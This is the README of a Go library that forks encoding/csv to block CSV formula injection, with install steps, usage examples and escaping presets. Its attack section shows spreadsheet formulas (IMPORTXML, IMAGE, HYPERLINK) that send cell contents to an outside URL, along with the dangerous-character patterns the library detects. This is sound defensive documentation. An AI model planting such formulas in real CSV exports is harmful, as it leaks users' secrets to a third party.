# Safe CSV writer

[![tag](https://img.shields.io/github/tag/samber/go-safe-csv-writer.svg)](https://github.com/samber/go-safe-csv-writer/releases)
![Go Version](https://img.shields.io/badge/Go-%3E%3D%201.17-%23007d9c)
[![GoDoc](https://godoc.org/github.com/samber/go-safe-csv-writer?status.svg)](https://pkg.go.dev/github.com/samber/go-safe-csv-writer)
![Build Status](https://github.com/samber/go-safe-csv-writer/actions/workflows/test.yml/badge.svg)
[![Go report](https://goreportcard.com/badge/github.com/samber/go-safe-csv-writer)](https://goreportcard.com/report/github.com/samber/go-safe-csv-writer)
[![Coverage](https://img.shields.io/codecov/c/github/samber/go-safe-csv-writer)](https://codecov.io/gh/samber/go-safe-csv-writer)
[![Contributors](https://img.shields.io/github/contributors/samber/go-safe-csv-writer)](https://github.com/samber/go-safe-csv-writer/graphs/contributors)
[![License](https://img.shields.io/github/license/samber/go-safe-csv-writer)](./LICENSE)

A fork of `encoding/csv` (go v1.23.4) package from Go stdlib, preventing CSV injection and data exfiltration, while maintaining compatibility with the original library.

## 🥷 Attack vector

### Simple formula

The following CSV:

```csv
col1,col2,col3
-21-21,=A1,42
```

Would be rendered in Excel like this:

```csv
col1,col2,col3
-42,col1,42
```

### Advanced formula

The following CSV might request external resource and leak data.

```csv
userId,secret
1,secret1
2,secret2
3,"=IMPORTXML(CONCAT(""http://samuel-berthe.fr?dump="", CONCATENATE(A1:B6)), ""//a"")"
4,=IMAGE("http://samuel-berthe.fr?dump=" & INDIRECT("B2"))
5,=HYPERLINK("http://samuel-berthe.fr?dump=" & INDIRECT("B2"), "a link")
```

### Protect

See [https://georgemauer.net/2017/10/07/csv-injection.html](https://georgemauer.net/2017/10/07/csv-injection.html).

and [https://owasp.org/www-community/attacks/CSV_Injection](https://owasp.org/www-community/attacks/CSV_Injection)

### OWASP-Compliant Protection

This library now supports **OWASP-compliant CSV injection prevention** using the recommended sanitization approach:

- Wraps all fields in double quotes
- Prepends a single quote (`'`) to dangerous fields only (not all fields)
- Escapes double quotes using an additional double quote

**Dangerous fields** are detected when:

1. Field starts with dangerous characters: `=`, `+`, `-`, `@`, `\t`, `\r`, `\n`
2. Field contains bypass patterns: quote/separator followed by dangerous character (e.g., `","=`, `";"=`)

This approach protects against both direct formula injection and bypass attacks via embedded separators/quotes, while avoiding unnecessary data pollution of safe fields.

## 🚀 Install

```sh
go get github.com/samber/go-safe-csv-writer
```

This library is v0 and follows SemVer strictly.

Some breaking changes might be made to exported APIs before v1.0.0.

## 🤠 Getting started

[GoDoc: https://godoc.org/github.com/samber/go-safe-csv-writer](https://godoc.org/github.com/samber/go-safe-csv-writer)

```go
import csv "github.com/samber/go-safe-csv-writer"

func main() {
    var buff strings.Builder

    // OWASP-compliant mode (recommended)
    writer := csv.NewSafeWriter(&buff, csv.OWASPSafe)
    writer.Write([]string{"userId", "secret", "comment"})
    writer.Write([]string{"-21+63", "=A1", "foo, bar"})
    writer.Flush()

    if err := writer.Error(); err != nil {
        panic(err)
    }

    output := buff.String()
    // "userId","secret","comment"
    // "'-21+63","'=A1","foo, bar"
}
```

Or with custom options:

```go
writer := csv.NewSafeWriter(
    &buff,
    csv.SafetyOpts{
        ForceDoubleQuotes: true,
        EscapeCharEqual:   true,
    },
)
```

## 🍱 Reference

```go
// Prototype:
func NewSafeWriter(w io.Writer, opts SafetyOpts) *SafeWriter
```

```go
// Available options:

type SafetyOpts struct {
    ForceDoubleQuotes bool
    EscapeCharEqual   bool
    EscapeCharPlus    bool
    EscapeCharMinus   bool
    EscapeCharAt      bool
    EscapeCharTab     bool
    EscapeCharCR      bool // Escapes 0x0D (Carriage Return, '\r')
    EscapeCharLF      bool // Escapes 0x0A (Line Feed, '\n')
    PrependSingleQuote bool // Prepend single quote to dangerous fields only
}
```

```go
// Presets:

// OWASPSafe provides OWASP-compliant CSV injection prevention.
// It wraps all fields in double quotes and prepends a single quote
// to fields that contain dangerous characters or bypass patterns.
// See https://owasp.org/www-community/attacks/CSV_Injection
var OWASPSafe = SafetyOpts{
	ForceDoubleQuotes: true,
	PrependSingleQuote: true,
}

var FullSafety = SafetyOpts{
	ForceDoubleQuotes: true,
	EscapeCharEqual:   true,
	EscapeCharPlus:    true,
	EscapeCharMinus:   true,
	EscapeCharAt:      true,
	EscapeCharTab:     true,
	EscapeCharCR:      true,
	EscapeCharLF:      true,
	PrependSingleQuote: false,
}

var EscapeAll = SafetyOpts{
	ForceDoubleQuotes: false,
	EscapeCharEqual:   true,
	EscapeCharPlus:    true,
	EscapeCharMinus:   true,
	EscapeCharAt:      true,
	EscapeCharTab:     true,
	EscapeCharCR:      true,
	EscapeCharLF:      true,
	PrependSingleQuote: false,
}
```

## 🤝 Contributing

- Ping me on Twitter [@samuelberthe](https://twitter.com/samuelberthe) (DMs, mentions, whatever :))
- Fork the [project](https://github.com/samber/go-safe-csv-writer)
- Fix [open issues](https://github.com/samber/go-safe-csv-writer/issues) or request new features

Don't hesitate ;)

```bash
# Install some dev dependencies
make tools

# Run tests
make test
# or
make watch-test
```

## 👤 Contributors

![Contributors](https://contrib.rocks/image?repo=samber/go-safe-csv-writer)

## 💫 Show your support

Give a ⭐️ if this project helped you!

[![GitHub Sponsors](https://img.shields.io/github/sponsors/samber?style=for-the-badge)](https://github.com/sponsors/samber)

## 📝 License

Copyright © 2024 [Samuel Berthe](https://github.com/samber).

This project is [MIT](./LICENSE) licensed.
